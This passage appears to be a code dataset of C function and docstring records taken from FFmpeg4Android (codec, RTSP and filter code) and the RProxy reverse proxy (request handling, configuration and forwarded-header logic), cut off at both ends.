               av_free(cx_frame);\n                    return AVERROR(ENOMEM);\n                }\n                memcpy(cx_frame->buf, pkt->data.frame.buf, pkt->data.frame.sz);\n                if (ctx->is_alpha) {\n                    cx_frame->buf_alpha = av_malloc(cx_frame->sz_alpha);\n                    if (!cx_frame->buf_alpha) {\n                        av_log(avctx, AV_LOG_ERROR,\n                               \"Data buffer alloc (%zu bytes) failed\\n\",\n                               cx_frame->sz_alpha);\n                        av_free(cx_frame);\n                        return AVERROR(ENOMEM);\n                    }\n                    memcpy(cx_frame->buf_alpha, pkt_alpha->data.frame.buf, pkt_alpha->data.frame.sz);\n                }\n                coded_frame_add(&ctx->coded_frame_list, cx_frame);\n            }\n            break;\n        case VPX_CODEC_STATS_PKT: {\n            struct vpx_fixed_buf *stats = &ctx->twopass_stats;\n            int err;\n            if ((err = av_reallocp(&stats->buf,\n                                   stats->sz +\n                                   pkt->data.twopass_stats.sz)) < 0) {\n                stats->sz = 0;\n                av_log(avctx, AV_LOG_ERROR, \"Stat buffer realloc failed\\n\");\n                return err;\n            }\n            memcpy((uint8_t*)stats->buf + stats->sz,\n                   pkt->data.twopass_stats.buf, pkt->data.twopass_stats.sz);\n            stats->sz += pkt->data.twopass_stats.sz;\n            break;\n        }\n        case VPX_CODEC_PSNR_PKT:\n            av_assert0(!ctx->have_sse);\n            ctx->sse[0] = pkt->data.psnr.sse[0];\n            ctx->sse[1] = pkt->data.psnr.sse[1];\n            ctx->sse[2] = pkt->data.psnr.sse[2];\n            ctx->sse[3] = pkt->data.psnr.sse[3];\n            ctx->have_sse = 1;\n            break;\n        case VPX_CODEC_CUSTOM_PKT:\n            //ignore unsupported/unrecognized packet types\n            break;\n        }\n    }\n\n    return size;\n}", "path": "ffmpeg-2.2\\libavcodec\\libvpxenc.c", "repo_name": "dennishucd/FFmpeg4Android", "stars": 95, "license": "None", "language": "c", "size": 15090}
{"docstring": "/**\n * Send a command to the RTSP server without waiting for the reply.\n *\n * @param s RTSP (de)muxer context\n * @param method the method for the request\n * @param url the target url for the request\n * @param headers extra header lines to include in the request\n * @param send_content if non-null, the data to send as request body content\n * @param send_content_length the length of the send_content data, or 0 if\n *                            send_content is null\n *\n * @return zero if success, nonzero otherwise\n */\n", "func_signal": "static int rtsp_send_cmd_with_content_async(AVFormatContext *s,\n                                            const char *method, const char *url,\n                                            const char *headers,\n                                            const unsigned char *send_content,\n                                            int send_content_length)", "code": "{\n    RTSPState *rt = s->priv_data;\n    char buf[4096], *out_buf;\n    char base64buf[AV_BASE64_SIZE(sizeof(buf))];\n\n    /* Add in RTSP headers */\n    out_buf = buf;\n    rt->seq++;\n    snprintf(buf, sizeof(buf), \"%s %s RTSP/1.0\\r\\n\", method, url);\n    if (headers)\n        av_strlcat(buf, headers, sizeof(buf));\n    av_strlcatf(buf, sizeof(buf), \"CSeq: %d\\r\\n\", rt->seq);\n    av_strlcatf(buf, sizeof(buf), \"User-Agent: %s\\r\\n\",  rt->user_agent);\n    if (rt->session_id[0] != '\\0' && (!headers ||\n        !strstr(headers, \"\\nIf-Match:\"))) {\n        av_strlcatf(buf, sizeof(buf), \"Session: %s\\r\\n\", rt->session_id);\n    }\n    if (rt->auth[0]) {\n        char *str = ff_http_auth_create_response(&rt->auth_state,\n                                                 rt->auth, url, method);\n        if (str)\n            av_strlcat(buf, str, sizeof(buf));\n        av_free(str);\n    }\n    if (send_content_length > 0 && send_content)\n        av_strlcatf(buf, sizeof(buf), \"Content-Length: %d\\r\\n\", send_content_length);\n    av_strlcat(buf, \"\\r\\n\", sizeof(buf));\n\n    /* base64 encode rtsp if tunneling */\n    if (rt->control_transport == RTSP_MODE_TUNNEL) {\n        av_base64_encode(base64buf, sizeof(base64buf), buf, strlen(buf));\n        out_buf = base64buf;\n    }\n\n    av_dlog(s, \"Sending:\\n%s--\\n\", buf);\n\n    ffurl_write(rt->rtsp_hd_out, out_buf, strlen(out_buf));\n    if (send_content_length > 0 && send_content) {\n        if (rt->control_transport == RTSP_MODE_TUNNEL) {\n            av_log(s, AV_LOG_ERROR, \"tunneling of RTSP requests \"\n                                    \"with content data not supported\\n\");\n            return AVERROR_PATCHWELCOME;\n        }\n        ffurl_write(rt->rtsp_hd_out, send_content, send_content_length);\n    }\n    rt->last_cmd_time = av_gettime();\n\n    return 0;\n}", "path": "ffmpeg-2.2\\libavformat\\rtsp.c", "repo_name": "dennishucd/FFmpeg4Android", "stars": 95, "license": "None", "language": "c", "size": 15090}
{"docstring": "/*\n *  Decode block data:\n *  extract huffman-coded transform coefficients from the bitstream,\n *  dequantize them, apply inverse transform and motion compensation\n *  in order to reconstruct the picture.\n *\n *  @param[in,out]  gb    the GetBit context\n *  @param[in]      band  pointer to the band descriptor\n *  @param[in]      tile  pointer to the tile descriptor\n *  @return     result code: 0 - OK, -1 = error (corrupted blocks data)\n */\n", "func_signal": "static int ivi_decode_blocks(GetBitContext *gb, IVIBandDesc *band,\n                             IVITile *tile, AVCodecContext *avctx)", "code": "{\n    int mbn, blk, num_blocks, blk_size, ret, is_intra, mc_type = 0;\n    int mv_x = 0, mv_y = 0;\n    int32_t prev_dc;\n    uint32_t cbp, quant, buf_offs;\n    IVIMbInfo *mb;\n    ivi_mc_func mc_with_delta_func, mc_no_delta_func;\n    const uint8_t *scale_tab;\n\n    /* init intra prediction for the DC coefficient */\n    prev_dc    = 0;\n    blk_size   = band->blk_size;\n    /* number of blocks per mb */\n    num_blocks = (band->mb_size != blk_size) ? 4 : 1;\n    if (blk_size == 8) {\n        mc_with_delta_func = ff_ivi_mc_8x8_delta;\n        mc_no_delta_func   = ff_ivi_mc_8x8_no_delta;\n    } else {\n        mc_with_delta_func = ff_ivi_mc_4x4_delta;\n        mc_no_delta_func   = ff_ivi_mc_4x4_no_delta;\n    }\n\n    for (mbn = 0, mb = tile->mbs; mbn < tile->num_MBs; mb++, mbn++) {\n        is_intra = !mb->type;\n        cbp      = mb->cbp;\n        buf_offs = mb->buf_offs;\n\n        quant = band->glob_quant + mb->q_delta;\n        if (avctx->codec_id == AV_CODEC_ID_INDEO4)\n            quant = av_clip(quant, 0, 31);\n        else\n            quant = av_clip(quant, 0, 23);\n\n        scale_tab = is_intra ? band->intra_scale : band->inter_scale;\n        if (scale_tab)\n            quant = scale_tab[quant];\n\n        if (!is_intra) {\n            mv_x = mb->mv_x;\n            mv_y = mb->mv_y;\n            if (band->is_halfpel) {\n                mc_type = ((mv_y & 1) << 1) | (mv_x & 1);\n                mv_x >>= 1;\n                mv_y >>= 1; /* convert halfpel vectors into fullpel ones */\n            }\n            if (mb->type) {\n                int dmv_x, dmv_y, cx, cy;\n\n                dmv_x = mb->mv_x >> band->is_halfpel;\n                dmv_y = mb->mv_y >> band->is_halfpel;\n                cx    = mb->mv_x &  band->is_halfpel;\n                cy    = mb->mv_y &  band->is_halfpel;\n\n                if (mb->xpos + dmv_x < 0 ||\n                    mb->xpos + dmv_x + band->mb_size + cx > band->pitch ||\n                    mb->ypos + dmv_y < 0 ||\n                    mb->ypos + dmv_y + band->mb_size + cy > band->aheight) {\n                    return AVERROR_INVALIDDATA;\n                }\n            }\n        }\n\n        for (blk = 0; blk < num_blocks; blk++) {\n            /* adjust block position in the buffer according to its number */\n            if (blk & 1) {\n                buf_offs += blk_size;\n            } else if (blk == 2) {\n                buf_offs -= blk_size;\n                buf_offs += blk_size * band->pitch;\n            }\n\n            if (cbp & 1) { /* block coded ? */\n                ret = ivi_decode_coded_blocks(gb, band, mc_with_delta_func,\n                                              mv_x, mv_y, &prev_dc, is_intra,\n                                              mc_type, quant, buf_offs, avctx);\n                if (ret < 0)\n                    return ret;\n            } else {\n                /* block not coded */\n                /* for intra blocks apply the dc slant transform */\n                /* for inter - perform the motion compensation without delta */\n                if (is_intra) {\n                    ret = ivi_dc_transform(band, &prev_dc, buf_offs, blk_size);\n                    if (ret < 0)\n                        return ret;\n                } else {\n                    ret = ivi_mc(band, mc_no_delta_func, buf_offs,\n                                 mv_x, mv_y, mc_type);\n                    if (ret < 0)\n                        return ret;\n                }\n            }\n\n            cbp >>= 1;\n        }// for blk\n    }// for mbn\n\n    align_get_bits(gb);\n\n    return 0;\n}", "path": "ffmpeg-2.2\\libavcodec\\ivi_common.c", "repo_name": "dennishucd/FFmpeg4Android", "stars": 95, "license": "None", "language": "c", "size": 15090}
{"docstring": "/* CONFIG_RTPDEC */\n", "func_signal": "void ff_rtsp_undo_setup(AVFormatContext *s, int send_packets)", "code": "{\n    RTSPState *rt = s->priv_data;\n    int i;\n\n    for (i = 0; i < rt->nb_rtsp_streams; i++) {\n        RTSPStream *rtsp_st = rt->rtsp_streams[i];\n        if (!rtsp_st)\n            continue;\n        if (rtsp_st->transport_priv) {\n            if (s->oformat) {\n                AVFormatContext *rtpctx = rtsp_st->transport_priv;\n                av_write_trailer(rtpctx);\n                if (rt->lower_transport == RTSP_LOWER_TRANSPORT_TCP) {\n                    uint8_t *ptr;\n                    if (CONFIG_RTSP_MUXER && rtpctx->pb && send_packets)\n                        ff_rtsp_tcp_write_packet(s, rtsp_st);\n                    avio_close_dyn_buf(rtpctx->pb, &ptr);\n                    av_free(ptr);\n                } else {\n                    avio_close(rtpctx->pb);\n                }\n                avformat_free_context(rtpctx);\n            } else if (rt->transport == RTSP_TRANSPORT_RDT && CONFIG_RTPDEC)\n                ff_rdt_parse_close(rtsp_st->transport_priv);\n            else if (rt->transport == RTSP_TRANSPORT_RTP && CONFIG_RTPDEC)\n                ff_rtp_parse_close(rtsp_st->transport_priv);\n        }\n        rtsp_st->transport_priv = NULL;\n        if (rtsp_st->rtp_handle)\n            ffurl_close(rtsp_st->rtp_handle);\n        rtsp_st->rtp_handle = NULL;\n    }\n}", "path": "ffmpeg-2.2\\libavformat\\rtsp.c", "repo_name": "dennishucd/FFmpeg4Android", "stars": 95, "license": "None", "language": "c", "size": 15090}
{"docstring": "/* HAVE_MMX_INLINE */\n", "func_signal": "av_cold void ff_MPV_common_init_x86(MpegEncContext *s)", "code": "{\n#if HAVE_MMX_INLINE\n    int cpu_flags = av_get_cpu_flags();\n\n    if (INLINE_MMX(cpu_flags)) {\n        s->dct_unquantize_h263_intra = dct_unquantize_h263_intra_mmx;\n        s->dct_unquantize_h263_inter = dct_unquantize_h263_inter_mmx;\n        s->dct_unquantize_mpeg1_intra = dct_unquantize_mpeg1_intra_mmx;\n        s->dct_unquantize_mpeg1_inter = dct_unquantize_mpeg1_inter_mmx;\n        if(!(s->flags & CODEC_FLAG_BITEXACT))\n            s->dct_unquantize_mpeg2_intra = dct_unquantize_mpeg2_intra_mmx;\n        s->dct_unquantize_mpeg2_inter = dct_unquantize_mpeg2_inter_mmx;\n    }\n#endif /* HAVE_MMX_INLINE */\n}", "path": "ffmpeg-2.2\\libavcodec\\x86\\mpegvideo.c", "repo_name": "dennishucd/FFmpeg4Android", "stars": 95, "license": "None", "language": "c", "size": 15090}
{"docstring": "/*\n *  Generate a huffman codebook from the given descriptor\n *  and convert it into the FFmpeg VLC table.\n *\n *  @param[in]   cb    pointer to codebook descriptor\n *  @param[out]  vlc   where to place the generated VLC table\n *  @param[in]   flag  flag: 1 - for static or 0 for dynamic tables\n *  @return     result code: 0 - OK, -1 = error (invalid codebook descriptor)\n */\n", "func_signal": "static int ivi_create_huff_from_desc(const IVIHuffDesc *cb, VLC *vlc, int flag)", "code": "{\n    int         pos, i, j, codes_per_row, prefix, not_last_row;\n    uint16_t    codewords[256]; /* FIXME: move this temporal storage out? */\n    uint8_t     bits[256];\n\n    pos = 0; /* current position = 0 */\n\n    for (i = 0; i < cb->num_rows; i++) {\n        codes_per_row = 1 << cb->xbits[i];\n        not_last_row  = (i != cb->num_rows - 1);\n        prefix        = ((1 << i) - 1) << (cb->xbits[i] + not_last_row);\n\n        for (j = 0; j < codes_per_row; j++) {\n            if (pos >= 256) /* Some Indeo5 codebooks can have more than 256 */\n                break;      /* elements, but only 256 codes are allowed! */\n\n            bits[pos] = i + cb->xbits[i] + not_last_row;\n            if (bits[pos] > IVI_VLC_BITS)\n                return AVERROR_INVALIDDATA; /* invalid descriptor */\n\n            codewords[pos] = inv_bits((prefix | j), bits[pos]);\n            if (!bits[pos])\n                bits[pos] = 1;\n\n            pos++;\n        }//for j\n    }//for i\n\n    /* number of codewords = pos */\n    return init_vlc(vlc, IVI_VLC_BITS, pos, bits, 1, 1, codewords, 2, 2,\n                    (flag ? INIT_VLC_USE_NEW_STATIC : 0) | INIT_VLC_LE);\n}", "path": "ffmpeg-2.2\\libavcodec\\ivi_common.c", "repo_name": "dennishucd/FFmpeg4Android", "stars": 95, "license": "None", "language": "c", "size": 15090}
{"docstring": "/**\n *  Close Indeo5 decoder and clean up its context.\n */\n", "func_signal": "av_cold int ff_ivi_decode_close(AVCodecContext *avctx)", "code": "{\n    IVI45DecContext *ctx = avctx->priv_data;\n\n    ivi_free_buffers(&ctx->planes[0]);\n\n    if (ctx->mb_vlc.cust_tab.table)\n        ff_free_vlc(&ctx->mb_vlc.cust_tab);\n\n#if IVI4_STREAM_ANALYSER\n    if (avctx->codec_id == AV_CODEC_ID_INDEO4) {\n    if (ctx->is_scalable)\n        av_log(avctx, AV_LOG_ERROR, \"This video uses scalability mode!\\n\");\n    if (ctx->uses_tiling)\n        av_log(avctx, AV_LOG_ERROR, \"This video uses local decoding!\\n\");\n    if (ctx->has_b_frames)\n        av_log(avctx, AV_LOG_ERROR, \"This video contains B-frames!\\n\");\n    if (ctx->has_transp)\n        av_log(avctx, AV_LOG_ERROR, \"Transparency mode is enabled!\\n\");\n    if (ctx->uses_haar)\n        av_log(avctx, AV_LOG_ERROR, \"This video uses Haar transform!\\n\");\n    if (ctx->uses_fullpel)\n        av_log(avctx, AV_LOG_ERROR, \"This video uses fullpel motion vectors!\\n\");\n    }\n#endif\n\n    return 0;\n}", "path": "ffmpeg-2.2\\libavcodec\\ivi_common.c", "repo_name": "dennishucd/FFmpeg4Android", "stars": 95, "license": "None", "language": "c", "size": 15090}
{"docstring": "/* close and free RTSP streams */\n", "func_signal": "void ff_rtsp_close_streams(AVFormatContext *s)", "code": "{\n    RTSPState *rt = s->priv_data;\n    int i, j;\n    RTSPStream *rtsp_st;\n\n    ff_rtsp_undo_setup(s, 0);\n    for (i = 0; i < rt->nb_rtsp_streams; i++) {\n        rtsp_st = rt->rtsp_streams[i];\n        if (rtsp_st) {\n            if (rtsp_st->dynamic_handler && rtsp_st->dynamic_protocol_context)\n                rtsp_st->dynamic_handler->free(\n                    rtsp_st->dynamic_protocol_context);\n            for (j = 0; j < rtsp_st->nb_include_source_addrs; j++)\n                av_free(rtsp_st->include_source_addrs[j]);\n            av_freep(&rtsp_st->include_source_addrs);\n            for (j = 0; j < rtsp_st->nb_exclude_source_addrs; j++)\n                av_free(rtsp_st->exclude_source_addrs[j]);\n            av_freep(&rtsp_st->exclude_source_addrs);\n\n            av_free(rtsp_st);\n        }\n    }\n    av_free(rt->rtsp_streams);\n    if (rt->asf_ctx) {\n        avformat_close_input(&rt->asf_ctx);\n    }\n    if (rt->ts && CONFIG_RTPDEC)\n        ff_mpegts_parse_close(rt->ts);\n    av_free(rt->p);\n    av_free(rt->recvbuf);\n}", "path": "ffmpeg-2.2\\libavformat\\rtsp.c", "repo_name": "dennishucd/FFmpeg4Android", "stars": 95, "license": "None", "language": "c", "size": 15090}
{"docstring": "/**\n *  Reverse \"nbits\" bits of the value \"val\" and return the result\n *  in the least significant bits.\n */\n", "func_signal": "static uint16_t inv_bits(uint16_t val, int nbits)", "code": "{\n    uint16_t res;\n\n    if (nbits <= 8) {\n        res = ff_reverse[val] >> (8 - nbits);\n    } else\n        res = ((ff_reverse[val & 0xFF] << 8) +\n               (ff_reverse[val >> 8])) >> (16 - nbits);\n\n    return res;\n}", "path": "ffmpeg-2.2\\libavcodec\\ivi_common.c", "repo_name": "dennishucd/FFmpeg4Android", "stars": 95, "license": "None", "language": "c", "size": 15090}
{"docstring": "/* parse the rtpmap description: <codec_name>/<clock_rate>[/<other params>] */\n", "func_signal": "static int sdp_parse_rtpmap(AVFormatContext *s,\n                            AVStream *st, RTSPStream *rtsp_st,\n                            int payload_type, const char *p)", "code": "{\n    AVCodecContext *codec = st->codec;\n    char buf[256];\n    int i;\n    AVCodec *c;\n    const char *c_name;\n\n    /* See if we can handle this kind of payload.\n     * The space should normally not be there but some Real streams or\n     * particular servers (\"RealServer Version 6.1.3.970\", see issue 1658)\n     * have a trailing space. */\n    get_word_sep(buf, sizeof(buf), \"/ \", &p);\n    if (payload_type < RTP_PT_PRIVATE) {\n        /* We are in a standard case\n         * (from http://www.iana.org/assignments/rtp-parameters). */\n        codec->codec_id = ff_rtp_codec_id(buf, codec->codec_type);\n    }\n\n    if (codec->codec_id == AV_CODEC_ID_NONE) {\n        RTPDynamicProtocolHandler *handler =\n            ff_rtp_handler_find_by_name(buf, codec->codec_type);\n        init_rtp_handler(handler, rtsp_st, codec);\n        /* If no dynamic handler was found, check with the list of standard\n         * allocated types, if such a stream for some reason happens to\n         * use a private payload type. This isn't handled in rtpdec.c, since\n         * the format name from the rtpmap line never is passed into rtpdec. */\n        if (!rtsp_st->dynamic_handler)\n            codec->codec_id = ff_rtp_codec_id(buf, codec->codec_type);\n    }\n\n    c = avcodec_find_decoder(codec->codec_id);\n    if (c && c->name)\n        c_name = c->name;\n    else\n        c_name = \"(null)\";\n\n    get_word_sep(buf, sizeof(buf), \"/\", &p);\n    i = atoi(buf);\n    switch (codec->codec_type) {\n    case AVMEDIA_TYPE_AUDIO:\n        av_log(s, AV_LOG_DEBUG, \"audio codec set to: %s\\n\", c_name);\n        codec->sample_rate = RTSP_DEFAULT_AUDIO_SAMPLERATE;\n        codec->channels = RTSP_DEFAULT_NB_AUDIO_CHANNELS;\n        if (i > 0) {\n            codec->sample_rate = i;\n            avpriv_set_pts_info(st, 32, 1, codec->sample_rate);\n            get_word_sep(buf, sizeof(buf), \"/\", &p);\n            i = atoi(buf);\n            if (i > 0)\n                codec->channels = i;\n        }\n        av_log(s, AV_LOG_DEBUG, \"audio samplerate set to: %i\\n\",\n               codec->sample_rate);\n        av_log(s, AV_LOG_DEBUG, \"audio channels set to: %i\\n\",\n               codec->channels);\n        break;\n    case AVMEDIA_TYPE_VIDEO:\n        av_log(s, AV_LOG_DEBUG, \"video codec set to: %s\\n\", c_name);\n        if (i > 0)\n            avpriv_set_pts_info(st, 32, 1, i);\n        break;\n    default:\n        break;\n    }\n    if (rtsp_st->dynamic_handler && rtsp_st->dynamic_handler->init)\n        rtsp_st->dynamic_handler->init(s, st->index,\n                                       rtsp_st->dynamic_protocol_context);\n    return 0;\n}", "path": "ffmpeg-2.2\\libavformat\\rtsp.c", "repo_name": "dennishucd/FFmpeg4Android", "stars": 95, "license": "None", "language": "c", "size": 15090}
{"docstring": "/**\n * Tell if the frame should be decimated, for example if it is no much\n * different with respect to the reference frame ref.\n */\n", "func_signal": "static int decimate_frame(AVFilterContext *ctx,\n                          AVFrame *cur, AVFrame *ref)", "code": "{\n    DecimateContext *decimate = ctx->priv;\n    int plane;\n\n    if (decimate->max_drop_count > 0 &&\n        decimate->drop_count >= decimate->max_drop_count)\n        return 0;\n    if (decimate->max_drop_count < 0 &&\n        (decimate->drop_count-1) > decimate->max_drop_count)\n        return 0;\n\n    for (plane = 0; ref->data[plane] && ref->linesize[plane]; plane++) {\n        int vsub = plane == 1 || plane == 2 ? decimate->vsub : 0;\n        int hsub = plane == 1 || plane == 2 ? decimate->hsub : 0;\n        if (diff_planes(ctx,\n                        cur->data[plane], ref->data[plane], ref->linesize[plane],\n                        FF_CEIL_RSHIFT(ref->width,  hsub),\n                        FF_CEIL_RSHIFT(ref->height, vsub)))\n            return 0;\n    }\n\n    return 1;\n}", "path": "ffmpeg-2.2\\libavfilter\\vf_mpdecimate.c", "repo_name": "dennishucd/FFmpeg4Android", "stars": 95, "license": "None", "language": "c", "size": 15090}
{"docstring": "/**\n * Store coded frame information in format suitable for return from encode2().\n *\n * Write information from @a cx_frame to @a pkt\n * @return packet data size on success\n * @return a negative AVERROR on error\n */\n", "func_signal": "static int storeframe(AVCodecContext *avctx, struct FrameListData *cx_frame,\n                      AVPacket *pkt, AVFrame *coded_frame)", "code": "{\n    int ret = ff_alloc_packet2(avctx, pkt, cx_frame->sz);\n    uint8_t *side_data;\n    if (ret >= 0) {\n        memcpy(pkt->data, cx_frame->buf, pkt->size);\n        pkt->pts = pkt->dts    = cx_frame->pts;\n        coded_frame->pts       = cx_frame->pts;\n        coded_frame->key_frame = !!(cx_frame->flags & VPX_FRAME_IS_KEY);\n\n        if (coded_frame->key_frame) {\n            coded_frame->pict_type = AV_PICTURE_TYPE_I;\n            pkt->flags            |= AV_PKT_FLAG_KEY;\n        } else\n            coded_frame->pict_type = AV_PICTURE_TYPE_P;\n\n        if (cx_frame->have_sse) {\n            int i;\n            /* Beware of the Y/U/V/all order! */\n            coded_frame->error[0] = cx_frame->sse[1];\n            coded_frame->error[1] = cx_frame->sse[2];\n            coded_frame->error[2] = cx_frame->sse[3];\n            coded_frame->error[3] = 0;    // alpha\n            for (i = 0; i < 4; ++i) {\n                avctx->error[i] += coded_frame->error[i];\n            }\n            cx_frame->have_sse = 0;\n        }\n        if (cx_frame->sz_alpha > 0) {\n            side_data = av_packet_new_side_data(pkt,\n                                                AV_PKT_DATA_MATROSKA_BLOCKADDITIONAL,\n                                                cx_frame->sz_alpha + 8);\n            if(side_data == NULL) {\n                av_free_packet(pkt);\n                av_free(pkt);\n                return AVERROR(ENOMEM);\n            }\n            AV_WB64(side_data, 1);\n            memcpy(side_data + 8, cx_frame->buf_alpha, cx_frame->sz_alpha);\n        }\n    } else {\n        return ret;\n    }\n    return pkt->size;\n}", "path": "ffmpeg-2.2\\libavcodec\\libvpxenc.c", "repo_name": "dennishucd/FFmpeg4Android", "stars": 95, "license": "None", "language": "c", "size": 15090}
{"docstring": "/**\n * Return 1 if the two planes are different, 0 otherwise.\n */\n", "func_signal": "static int diff_planes(AVFilterContext *ctx,\n                       uint8_t *cur, uint8_t *ref, int linesize,\n                       int w, int h)", "code": "{\n    DecimateContext *decimate = ctx->priv;\n    DSPContext *dspctx = &decimate->dspctx;\n\n    int x, y;\n    int d, c = 0;\n    int t = (w/16)*(h/16)*decimate->frac;\n    int16_t block[8*8];\n\n    /* compute difference for blocks of 8x8 bytes */\n    for (y = 0; y < h-7; y += 4) {\n        for (x = 8; x < w-7; x += 4) {\n            dspctx->diff_pixels(block,\n                                cur+x+y*linesize,\n                                ref+x+y*linesize, linesize);\n            d = dspctx->sum_abs_dctelem(block);\n            if (d > decimate->hi)\n                return 1;\n            if (d > decimate->lo) {\n                c++;\n                if (c > t)\n                    return 1;\n            }\n        }\n    }\n    return 0;\n}", "path": "ffmpeg-2.2\\libavfilter\\vf_mpdecimate.c", "repo_name": "dennishucd/FFmpeg4Android", "stars": 95, "license": "None", "language": "c", "size": 15090}
{"docstring": "/**\n * @brief allocates a new downstream_t, and appends it to the\n *        rproxy->downstreams list. This is callback for the\n *        lztq_for_each function from rproxy_thread_init().\n *\n * @param elem\n * @param arg\n *\n * @return\n */\n", "func_signal": "static int\nadd_downstream(lztq_elem * elem, void * arg)", "code": "{\n    rproxy_t         * rproxy = arg;\n    downstream_cfg_t * ds_cfg = lztq_elem_data(elem);\n    downstream_t     * downstream;\n    lztq_elem        * nelem;\n\n    assert(rproxy != NULL);\n    assert(ds_cfg != NULL);\n\n    downstream = downstream_new(rproxy, ds_cfg);\n    assert(downstream != NULL);\n\n    nelem      = lztq_append(rproxy->downstreams, downstream,\n                             sizeof(downstream), downstream_free);\n    assert(nelem != NULL);\n\n    return 0;\n}", "path": "src\\rproxy.c", "repo_name": "fireeye/RProxy", "stars": 109, "license": "other", "language": "c", "size": 696}
{"docstring": "/**\n * @brief Called when an upstream request is in the pending queue and the\n *        configured timeout has been reached.\n *\n * @param fd\n * @param what\n * @param arg\n */\n", "func_signal": "static void\ndownstream_pending_timeout(evutil_socket_t fd, short what, void * arg)", "code": "{\n    request_t       * ds_req;\n    rproxy_t        * rproxy;\n    evhtp_request_t * up_req;\n    rule_t          * rule;\n    rule_cfg_t      * rule_cfg;\n\n    ds_req   = arg;\n    assert(ds_req != NULL);\n\n    rule     = ds_req->rule;\n    assert(rule != NULL);\n\n    rule_cfg = rule->config;\n    assert(rule_cfg != NULL);\n\n    rproxy   = ds_req->rproxy;\n    assert(rproxy != NULL);\n\n    if (rule_cfg->passthrough == true) {\n        /*\n         * since we're in passthrough mode, we don't need to free any evhtp\n         * resources; so we just close the upstream socket and free the request\n         */\n        if (ds_req->pending) {\n            TAILQ_REMOVE(&rproxy->pending, ds_req, next);\n            rproxy->n_pending -= 1;\n        }\n\n        bufferevent_free(ds_req->upstream_bev);\n\n        logger_log(rule->err_log, lzlog_notice,\n                   \"%s(): pending timeout hit for upstream (passthrough)\", __FUNCTION__);\n\n        return request_free(ds_req);\n    }\n\n    up_req = ds_req->upstream_request;\n    assert(up_req != NULL);\n\n    /* unset all hooks except for the fini, evhtp_send_reply() will call the\n     * fini function after the 503 message has been delivered */\n    evhtp_unset_hook(&up_req->hooks, evhtp_hook_on_headers);\n    evhtp_unset_hook(&up_req->hooks, evhtp_hook_on_new_chunk);\n    evhtp_unset_hook(&up_req->hooks, evhtp_hook_on_chunk_complete);\n    evhtp_unset_hook(&up_req->hooks, evhtp_hook_on_chunks_complete);\n    evhtp_unset_hook(&up_req->hooks, evhtp_hook_on_read);\n    evhtp_unset_hook(&up_req->hooks, evhtp_hook_on_error);\n\n    up_req->keepalive = 0;\n\n    evhtp_headers_add_header(up_req->headers_out, evhtp_header_new(\"Connection\", \"close\", 0, 0));\n    evhtp_request_resume(up_req);\n    evhtp_send_reply(up_req, 503);\n\n    if (ds_req->rule) {\n        logger_log(rule->err_log, lzlog_notice,\n                   \"%s(): pending timeout hit for upstream client\", __FUNCTION__);\n    }\n}", "path": "src\\rproxy.c", "repo_name": "fireeye/RProxy", "stars": 109, "license": "other", "language": "c", "size": 696}
{"docstring": "/**\n * @brief called when an upstream socket encounters an error.\n *\n * @param upstream_req\n * @param arg\n */\n", "func_signal": "static void\nupstream_error(evhtp_request_t * upstream_req, short events, void * arg)", "code": "{\n    request_t      * request;\n    rproxy_t       * rproxy;\n    downstream_c_t * ds_conn;\n    rule_t         * rule;\n\n    request = arg;\n    assert(request != NULL);\n\n    rule    = request->rule;\n    assert(rule != NULL);\n\n    rproxy  = request->rproxy;\n    assert(rproxy != NULL);\n\n    evhtp_unset_all_hooks(&upstream_req->hooks);\n\n    logger_log(rule->err_log, lzlog_warn, \"%s(): client aborted, err = %x\",\n               __FUNCTION__, events);\n\n    if (request->pending) {\n        /* upstream encountered socket error while still in a pending state */\n        assert(request->downstream_conn == NULL);\n\n        TAILQ_REMOVE(&rproxy->pending, request, next);\n        rproxy->n_pending -= 1;\n        request_free(request);\n        return;\n    }\n\n    request->upstream_err = 1;\n\n    ds_conn = request->downstream_conn;\n    assert(ds_conn != NULL);\n\n    if (!request->reading) {\n        /* since we are not currently dealing with data being parsed by\n         * downstream_connection_readcb, we must do all the resource cleanup\n         * here.\n         */\n\n        if (request->done) {\n            /* the request was completely finished, so we can safely set the\n             * downstream as idle.\n             */\n            logger_log_request_error(rule->err_log, request,\n                                     \"%s(): req completed, client aborted\", __FUNCTION__);\n            downstream_connection_set_idle(ds_conn);\n        } else {\n            /* request never completed, set the connection to down */\n            logger_log_request_error(rule->err_log, request,\n                                     \"req incomplete, client aborted\", __FUNCTION__);\n            downstream_connection_set_down(ds_conn);\n        }\n\n        if (ds_conn->request == request) {\n            ds_conn->request = NULL;\n        }\n\n        request_free(request);\n    }\n}", "path": "src\\rproxy.c", "repo_name": "fireeye/RProxy", "stars": 109, "license": "other", "language": "c", "size": 696}
{"docstring": "/**\n * @brief Convert the config value of \"lb-method\" to a lb_method enum type.\n *\n * @param lbstr\n *\n * @return the lb_method enum\n */\n", "func_signal": "static lb_method\nlbstr_to_lbtype(const char * lbstr)", "code": "{\n    if (!lbstr) {\n        return lb_method_rtt;\n    }\n\n    if (!strcasecmp(lbstr, \"rtt\")) {\n        return lb_method_rtt;\n    }\n\n    if (!strcasecmp(lbstr, \"roundrobin\")) {\n        return lb_method_rr;\n    }\n\n    if (!strcasecmp(lbstr, \"random\")) {\n        return lb_method_rand;\n    }\n\n    if (!strcasecmp(lbstr, \"most-idle\")) {\n        return lb_method_most_idle;\n    }\n\n    if (!strcasecmp(lbstr, \"none\")) {\n        return lb_method_none;\n    }\n\n    return lb_method_rtt;\n}", "path": "src\\cfg.c", "repo_name": "fireeye/RProxy", "stars": 109, "license": "other", "language": "c", "size": 696}
{"docstring": "/* append_ssl_x_headers */\n", "func_signal": "int\nappend_x_headers(headers_cfg_t * headers_cfg, evhtp_request_t * upstream_req)", "code": "{\n    evhtp_headers_t * headers;\n    char              tmp1[1024];\n    char              tmp2[1024];\n\n    if (!headers_cfg || !upstream_req) {\n        return -1;\n    }\n\n    if (!(headers = upstream_req->headers_in)) {\n        return -1;\n    }\n\n    if (headers_cfg->x_forwarded_for == true) {\n        struct sockaddr * sa;\n        void            * src;\n        char            * fmt;\n        unsigned short    port;\n        int               sres;\n\n        src = NULL;\n        sa  = upstream_req->conn->saddr;\n\n        if (sa->sa_family == AF_INET) {\n            src  = &(((struct sockaddr_in *)sa)->sin_addr);\n            port = ntohs(((struct sockaddr_in *)sa)->sin_port);\n            fmt  = \"%s:%hu\";\n        } else if (sa->sa_family == AF_INET6) {\n            src  = &(((struct sockaddr_in6 *)sa)->sin6_addr);\n            port = ntohs(((struct sockaddr_in6 *)sa)->sin6_port);\n            fmt  = \"[%s]:%hu\";\n        }\n\n        if (!src || 